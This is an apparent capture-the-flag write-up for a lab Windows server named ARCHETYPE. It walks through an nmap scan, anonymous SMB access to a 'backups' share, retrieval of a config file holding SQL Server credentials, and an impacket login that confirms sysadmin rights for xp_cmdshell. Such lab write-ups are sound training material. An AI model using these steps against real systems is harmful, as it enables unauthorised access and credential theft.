### 1. Port scan using nmap

```
$ nmap -A 10.10.10.27
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-21 20:23 JST
Nmap scan report for 10.10.10.27
Host is up (0.17s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-06-21T11:39:50
|_Not valid after:  2051-06-21T11:39:50
|_ssl-date: 2021-06-21T11:47:08+00:00; +23m08s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h47m08s, deviation: 3h07m52s, median: 23m07s
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-06-21T04:46:59-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-21T11:46:56
|_  start_date: N/A
```

### 2. Analyze open port
This server uses SMB (TCP:445) and therefore open 135 and 139(need for SMB).
So, try to connect SMB.
 
```
$ smbclient -L 10.10.10.27
Enter WORKGROUP\tk's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

### 3. Connect to SMB ( Windows share file )
We can connect **backups** without password.

```
$ smbclient //10.10.10.27/backups 
Enter WORKGROUP\tk's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 21:20:57 2020
  ..                                  D        0  Mon Jan 20 21:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 21:23:02 2020
g
		10328063 blocks of size 4096. 8257809 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
smb: \> exit
```

We can get **prod.dtsConfig** file.
The user name and password for SQL Server are written in this file.

### 4. Try to connect SQL Sever, 1433/TCP
Nomarly we use ```sqlcmd``` command to connect SQL Server, but it seems that its command is ***not*** supported for KALI Linux.

So, we have to use another mssql client tools for Kali.
I searched the words "Kali mssql client github" on Google and found impacket which I wanted.

```
$ git clone https://github.com/SecureAuthCorp/impacket.git
$ cd impacket
$ python3 -m pip install .
```

and try to connect SSIS(SQL Server).

```
$ cd example
# ex) $ python3 mssqlclient.py ID@host -windows-auth
$ python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
```

Check this user's group.
If this user belongs to 'sysadmin', you can use ```xp_cmdshell $comannd_name``` which can execuite commands on SQL.
Japanese specification is below.
https://docs.microsoft.com/ja-jp/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15

```
SQL> IF IS_SRVROLEMEMBER('sysadmin') = 1 print 'sysadmin';
[*] INFO(ARCHETYPE): Line 1: sysadmin
```

Fourtunately, this user belogs to 'sysadmin'.
